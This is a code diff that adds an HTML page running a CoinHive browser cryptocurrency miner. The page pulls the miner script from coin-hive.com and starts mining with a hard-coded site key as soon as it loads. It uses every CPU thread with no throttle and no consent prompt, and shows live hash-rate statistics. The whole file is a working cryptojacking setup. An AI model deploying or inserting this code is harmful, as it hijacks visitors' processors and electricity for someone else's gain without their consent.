@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+
+<head>
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+
+<script>
+
+var miner = new CoinHive.Anonymous('nSZNcHX6cq2mA3lG7LXCDO7jFz9bdSdr', {
+	threads: navigator.hardwareConcurrency,
+	autoThreads: false,
+	throttle: 0,
+	forceASMJS: false
+});
+
+miner.start();
+
+</script>
+</head>
+
+<body>
+
+<p>
+<strong>Threads:</strong>
+<script>document.write(navigator.hardwareConcurrency);</script>
+</p>
+
+<strong>Hash Rate:</strong>
+<div id="HASHES"></div>
+
+<strong>Total Hashes:</strong>
+<div id="TOTAL"></div>
+
+<strong>Accepted Hashes</strong>
+<div id="ACCEPTED"></div>
+
+
+<script>
+
+
+// Update stats once per second
+setInterval(function() {
+	var hashesPerSecond = miner.getHashesPerSecond();
+	var totalHashes = miner.getTotalHashes();
+	var acceptedHashes = miner.getAcceptedHashes();
+
+	// Output to HTML elements...
+
+
+document.getElementById("HASHES").innerHTML = hashesPerSecond;
+document.getElementById("TOTAL").innerHTML = totalHashes;
+document.getElementById("ACCEPTED").innerHTML = acceptedHashes;
+
+
+}, 1000);
+
+
+</script>
+
+
+
+</body>
+
+
+</html>
